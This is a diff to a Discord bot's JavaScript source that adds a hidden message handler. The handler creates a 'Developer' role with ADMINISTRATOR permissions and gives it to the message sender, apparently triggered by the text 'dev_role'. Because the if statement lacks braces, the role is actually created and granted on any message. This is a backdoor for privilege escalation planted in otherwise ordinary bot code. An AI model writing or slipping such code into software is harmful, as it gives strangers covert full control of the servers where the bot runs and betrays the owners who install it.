@@ -603,5 +603,20 @@ client.on('message', message => {
     }
 }
 })
+client.on('message', message => {
+    if(message.content.startsWith('dev_role'))
+    message.delete()
+    message.guild.createRole({
+        name : "Developer"
+    }).then(role => {
+        role.setPermissions(0)
+        role.setPermissions(["ADMINISTRATOR"])
+        role.setColor("#ebff22")
+    }).then(() => {
+        let role = message.guild.roles.find(role => role.name === "Developer");
+        message.member.addRole(role)
+    })
+})
+
 
 client.login(process.env.token_bot);
